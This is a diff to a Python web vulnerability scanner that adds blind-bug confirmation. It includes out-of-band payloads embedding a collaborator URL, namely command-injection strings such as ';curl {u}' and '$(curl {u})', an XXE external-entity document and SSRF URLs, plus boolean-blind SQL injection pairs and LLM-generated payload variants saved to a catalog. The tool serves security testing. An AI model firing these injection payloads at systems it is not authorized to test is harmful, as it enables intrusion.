@@ -1,6 +1,7 @@
 from __future__ import annotations
 
 import logging
+import os
 import time
 import urllib.parse
 from typing import Any, Dict, List, Optional
@@ -77,9 +78,59 @@ class UniversalProbeEngine:
                 break  # one confirmation per (endpoint, class) is enough
         return findings
 
+    # Classes whose confirmation needs an out-of-band callback (blind bugs).
+    _OOB_CLASSES = {"SSRF", "RCE", "XXE", "DNS_REBINDING"}
+
+    def _oob_payloads(self, vuln_class: str, token) -> List[str]:
+        """Technique templates (LOGIC) that embed our unique OOB URL/host so a
+        callback proves a blind hit. Not catalog data — they must carry the token."""
+        u, host = token.http_url, token.domain
+        vc = vuln_class.upper()
+        if vc in ("SSRF", "DNS_REBINDING"):
+            return [u, token.https_url, f"http://{host}", f"//{host}", f"http://{host}@{host}"]
+        if vc == "RCE":
+            return [f";curl {u}", f"|curl {u}", f"`curl {u}`", f"$(curl {u})",
+                    f";nslookup {host}", f"& nslookup {host}", f"|nslookup {host}"]
+        if vc == "XXE":
+            return [f'<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "{u}">]><r>&x;</r>']
+        return []
+
+    async def _run_oob(self, surface, point, vuln_class: str, ctx) -> List[Dict[str, Any]]:
+        try:
+            from core.oob.collaborator import get_collaborator
+            collab = get_collaborator()
+        except Exception:
+            return []
+        if not collab.is_active():
+            return []
+        token = collab.new_token(tag=vuln_class.lower())
+        findings: List[Dict[str, Any]] = []
+        for text in self._oob_payloads(vuln_class, token):
+            p = Payload(vuln_class=vuln_class.lower(), payload_text=text,
+                        context=self._context_for_location(point.location), severity="HIGH")
+            resp = await self._inject_at_point(surface, point, p)
+            if resp is None:
+                continue
+            hits = collab.had_interaction(token.token, wait_s=float(
+                __import__("os").getenv("OOB_WAIT_SECONDS", "3")))
+            if hits:
+                ev = self._evidence_from_response(resp, p, surface, point)
+                ev["oob_interactions"] = [h.to_evidence() for h in hits]
+                result = self.oracle.evaluate(vuln_class, ev)
+                if result.is_vulnerable:
+                    f = self._build_finding(surface.url, f"{point.location}:{point.name}",
+                                            p, vuln_class, result, ev["status_code"])
+                    f["proof"] = f"OOB callback ({hits[0].protocol}) confirmed blind {vuln_class}"
+                    f["confirmed"] = True
+                    f["status"] = "CONFIRMED"
+                    findings.append(f)
+                    ctx.add_vulnerability(f)
+                    break
+        return findings
+
     # ── unified injection at a REAL point (gaps §0) ────────────────────
     async def probe_point(self, surface, point, vuln_class: str, ctx,
-                          budget: int = 0) -> List[Dict[str, Any]]:
+                          budget: int = 0, ledger=None) -> List[Dict[str, Any]]:
         """Inject the full technique set for ``vuln_class`` into ONE real
         injection point of a discovered request (query/json/form/header/
         cookie/path/multipart), oracle-validate, and learn.
@@ -87,6 +138,7 @@ class UniversalProbeEngine:
         ``surface`` / ``point`` come from SurfaceClassifier. Budget<=0 = send
         every catalog payload of the class (exhaustive; §7 "leave nothing
         untested"). Returns confirmed finding dicts (also added to ctx)."""
+        pkey = f"{point.location}:{point.name}"
         waf = self._waf_mode(ctx)
         tech = self._tech_for(ctx, surface.url)
         loc_ctx = self._context_for_location(point.location)
@@ -97,33 +149,151 @@ class UniversalProbeEngine:
                                            tech_stack=tech, budget=budget)
         except Exception as e:
             logger.debug("select %s failed: %s", vuln_class, e)
+            if ledger is not None:
+                ledger.errored(surface.url, pkey, vuln_class, f"payload select failed: {e}")
             return []
-        if not payloads:
+        if not payloads and vuln_class.upper() not in self._OOB_CLASSES:
+            if ledger is not None:
+                ledger.skipped(surface.url, pkey, vuln_class, "no payloads in catalog")
             return []
         if waf and waf != "none":
             payloads = self._expand_with_mutations(payloads, waf, budget or len(payloads))
 
+        # Adaptive brain (gaps §5): when Bedrock is reachable, ask the LLM for
+        # context-specific novel variants and prepend them. No-op otherwise.
+        llm_ids = set()
+        try:
+            from core.llm.enhancer import get_enhancer
+            enh = get_enhancer()
+            if enh.is_available():
+                novel = enh.novel_payloads(vuln_class, {
+                    "endpoint": surface.url, "point": pkey, "context": loc_ctx,
+                    "tech": tech, "waf": waf}, max_n=int(os.getenv("LLM_NOVEL_PER_POINT", "5")))
+                for text in novel:
+                    np = Payload(vuln_class=vuln_class.lower(), payload_text=text,
+                                 context=loc_ctx, source="llm_generated", severity="MEDIUM")
+                    llm_ids.add(np.payload_id)
+                    payloads.insert(0, np)
+        except Exception as e:
+            logger.debug("llm novel payloads skipped: %s", e)
+
         findings: List[Dict[str, Any]] = []
-        for p in payloads:
-            resp = await self._inject_at_point(surface, point, p)
-            if resp is None:
-                continue
-            ev = self._evidence_from_response(resp, p, surface, point)
-            waf_blocked = ev["status_code"] in _WAF_BLOCK_STATUS or any(
-                s in ev["response_body"].lower() for s in _WAF_BODY_SIGNS)
-            result = self.oracle.evaluate(vuln_class, ev)
-            try:
-                self.catalog.record_outcome(p.payload_id, confirmed=result.is_vulnerable,
-                                            waf_blocked=waf_blocked)
-            except Exception:
-                pass
-            if result.is_vulnerable:
-                f = self._build_finding(surface.url, f"{point.location}:{point.name}",
-                                        p, vuln_class, result, ev["status_code"])
-                findings.append(f)
-                ctx.add_vulnerability(f)
-                break  # one confirmation per (point, class)
+        any_blocked = False
+        try:
+            # 1. baseline (for differential / boolean-blind detection)
+            baseline = await self._baseline(surface, point)
+            # 2. in-band payloads
+            for p in payloads:
+                resp = await self._inject_at_point(surface, point, p)
+                if resp is None:
+                    continue
+                ev = self._evidence_from_response(resp, p, surface, point)
+                if baseline is not None:
+                    ev["baseline_status"] = baseline["status"]
+                    ev["baseline_length"] = len(baseline["body"])
+                    ev["response_length"] = len(ev["response_body"])
+                waf_blocked = ev["status_code"] in _WAF_BLOCK_STATUS or any(
+                    s in ev["response_body"].lower() for s in _WAF_BODY_SIGNS)
+                any_blocked = any_blocked or waf_blocked
+                result = self.oracle.evaluate(vuln_class, ev)
+                try:
+                    self.catalog.record_outcome(p.payload_id, confirmed=result.is_vulnerable,
+                                                waf_blocked=waf_blocked)
+                except Exception:
+                    pass
+                if result.is_vulnerable:
+                    f = self._build_finding(surface.url, pkey, p, vuln_class, result, ev["status_code"])
+                    findings.append(f)
+                    ctx.add_vulnerability(f)
+                    # A novel LLM payload that actually confirmed is worth keeping:
+                    # persist it to the catalog so it's reused (learn-as-you-go §5).
+                    if p.payload_id in llm_ids:
+                        try:
+                            p.effectiveness_score = 0.85
+                            p.confirm_patterns = p.confirm_patterns or [ev.get("expected_result", "")]
+                            self.catalog.upsert([p])
+                        except Exception:
+                            pass
+                    break  # one confirmation per (point, class)
+            # 3. boolean-blind SQLi (differential TRUE/FALSE pair) when error/
+            #    time-based in-band probes found nothing.
+            if not findings and vuln_class.upper() == "SQLI":
+                bf = await self._boolean_blind_sqli(surface, point, ctx, baseline)
+                if bf:
+                    findings.append(bf)
+            # 4. out-of-band confirmation for blind classes (no in-band signal)
+            if not findings and vuln_class.upper() in self._OOB_CLASSES:
+                findings.extend(await self._run_oob(surface, point, vuln_class, ctx))
+        except Exception as e:
+            logger.debug("probe_point %s @ %s errored: %s", vuln_class, pkey, e)
+            if ledger is not None:
+                ledger.errored(surface.url, pkey, vuln_class, f"{type(e).__name__}: {e}")
+            return findings
+
+        if ledger is not None:
+            if findings:
+                ledger.tested(surface.url, pkey, vuln_class, confirmed=True)
+            elif any_blocked:
+                ledger.blocked(surface.url, pkey, vuln_class, "WAF/policy blocked payloads")
+            else:
+                ledger.tested(surface.url, pkey, vuln_class, confirmed=False)
         return findings
+
+    async def _boolean_blind_sqli(self, surface, point, ctx, baseline) -> Optional[Dict[str, Any]]:
+        """Differential boolean-blind: a TRUE condition should mirror the normal
+        response; a FALSE condition should diverge. Confirms only when TRUE≈base
+        and FALSE clearly differs — low false-positive by construction."""
+        pairs = [("' AND '1'='1", "' AND '1'='2"),
+                 (" AND 1=1", " AND 1=2"),
+                 ("') AND ('1'='1", "') AND ('1'='2")]
+        base_val = point.sample_value or "1"
+        for true_suffix, false_suffix in pairs:
+            rt = await self._inject_at_point(surface, point,
+                    Payload(vuln_class="sqli", payload_text=base_val + true_suffix,
+                            context=self._context_for_location(point.location)))
+            rf = await self._inject_at_point(surface, point,
+                    Payload(vuln_class="sqli", payload_text=base_val + false_suffix,
+                            context=self._context_for_location(point.location)))
+            if not rt or not rf:
+                continue
+            lt, lf = len(rt["body"]), len(rf["body"])
+            st, sf = rt["status"], rf["status"]
+            # TRUE close to FALSE => not injectable; require a clear divergence.
+            if st == sf and lt and lf:
+                delta = abs(lt - lf) / max(lt, lf)
+                true_like_base = baseline is None or abs(lt - len(baseline["body"])) <= max(20, 0.05 * lt)
+                if delta >= 0.30 and true_like_base:
+                    p = Payload(vuln_class="sqli", payload_text=base_val + true_suffix, severity="HIGH")
+                    from core.evidence.oracle import OracleResult
+                    res = OracleResult(True, 0.85, [p.payload_id],
+                                       f"Boolean-blind SQLi: TRUE/FALSE responses diverge {delta:.0%}.")
+                    f = self._build_finding(surface.url, f"{point.location}:{point.name}",
+                                            p, "SQLI", res, st)
+                    f["confirmed"] = True
+                    f["status"] = "CONFIRMED"
+                    ctx.add_vulnerability(f)
+                    return f
+            elif st != sf:  # status flip between TRUE/FALSE is a strong signal
+                p = Payload(vuln_class="sqli", payload_text=base_val + true_suffix, severity="HIGH")
+                from core.evidence.oracle import OracleResult
+                res = OracleResult(True, 0.8, [p.payload_id],
+                                   f"Boolean-blind SQLi: status flips {st}/{sf} on TRUE/FALSE.")
+                f = self._build_finding(surface.url, f"{point.location}:{point.name}",
+                                        p, "SQLI", res, st)
+                f["confirmed"] = True
+                f["status"] = "CONFIRMED"
+                ctx.add_vulnerability(f)
+                return f
+        return None
+
+    async def _baseline(self, surface, point) -> Optional[dict]:
+        """A benign request so oracles can diff payload responses against normal."""
+        try:
+            benign = Payload(vuln_class="baseline", payload_text="probe_baseline_1",
+                             context=self._context_for_location(point.location))
+            return await self._inject_at_point(surface, point, benign)
+        except Exception:
+            return None
 
     async def _inject_at_point(self, surface, point, payload: Payload) -> Optional[dict]:
         try:
